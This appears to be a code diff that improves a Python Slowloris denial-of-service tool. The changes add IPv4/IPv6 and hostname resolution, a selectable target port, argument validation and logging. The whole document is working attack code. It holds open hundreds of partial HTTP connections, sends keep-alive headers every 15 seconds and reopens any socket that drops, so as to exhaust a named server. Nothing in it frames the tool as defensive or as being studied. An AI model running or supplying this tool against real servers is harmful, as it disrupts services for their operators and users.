@@ -11,6 +11,7 @@ import time
 import socket
 import random
 import argparse
+import ipaddress
 
 
 #Headers to be sent at the beginning of the connection
@@ -28,11 +29,13 @@ def socket_error(sock):
     return sock
 
 
-def init_socket(ip_address):
+def init_socket(socket_tuple):
     """ Inits a socket and sends the first headers. It also sends the start
     of the request.
     """
-    sock = socket.create_connection((ip_address, 80), timeout=4)
+    sock = socket.socket(socket_tuple[0], socket_tuple[1], socket_tuple[2])
+    sock.settimeout(15)
+    sock.connect(socket_tuple[4])
 
     if sock:
         try:
@@ -55,28 +58,49 @@ def send_header(sock):
             sock.close()
             LIST_OF_SOCKETS.remove(sock)
 
-def slow_loris(ip_address, sock_number=200):
+def slow_loris(socket_tuple, sock_number):
     """ Implements the attack. Creates the given number of sockets, and manages
     it, recreating socket if necessary.
     It assumes that the ip is not none, and that sock_number is a positive
     number.
     """
     for _ in range(sock_number):
-        sock = init_socket(ip_address)
+        sock = init_socket(socket_tuple)
         if sock:
             LIST_OF_SOCKETS.append(sock)
             print("Created socket %d" % len(LIST_OF_SOCKETS))
 
     while True:
+        print("Sending keep-alive headers."
+              "Remaining sockets: %d" % len(LIST_OF_SOCKETS)
+        )
         for sock in LIST_OF_SOCKETS:
             send_header(sock)
         for _ in range(sock_number - len(LIST_OF_SOCKETS)):
-            sock = init_socket(ip_address)
+            sock = init_socket(socket_tuple)
             if sock:
                 LIST_OF_SOCKETS.append(sock)
                 print("Recreating socket...")
         time.sleep(15)
     return 0
+
+
+
+def validate_args(args):
+    """ Checks if the arguments are valid or not. """
+    # Is the number of sockets positive ?
+    if not args.number > 0:
+        print("[ERROR] Number of sockets should be positive. Received %d" % args.number)
+        exit(1)
+    # Is a valid IP address or valid name ?
+    try:
+        servers = socket.getaddrinfo(args.address, args.port, proto=socket.IPPROTO_TCP)
+        return servers[0]
+    except socket.gaierror as error:
+        print(error)
+        print("Please, provide a valid IPv4, IPv6 address or a valid domain name.")
+        exit(1)
+
 
 if __name__ == "__main__":
 
@@ -87,18 +111,26 @@ if __name__ == "__main__":
                    with the Slow Loris attack"
     PARSER = argparse.ArgumentParser(description=DESCRIPTION)
     PARSER.add_argument(
-        "ip",
+        "address",
         type=str,
         action="store",
         metavar="ADDRESS",
-        help="The address or hostname to attack"
+        help="The address or hostname to attack",
     )
     PARSER.add_argument(
         "-n", "--number",
-        description="Number of sockets to open (default=200)",
+        help="Number of sockets to open (default=200)",
         action="store",
-        type=int
+        type=int,
+        default=200,
     )
-
+    PARSER.add_argument(
+        "-p", "--port",
+        help="Port to attack",
+        action="store",
+        type=int,
+        default=80,
+    )
     ARGS = PARSER.parse_args()
-    slow_loris(ARGS.ip, ARGS.number)
+    socket_tuple = validate_args(ARGS)
+    slow_loris(socket_tuple, ARGS.number)
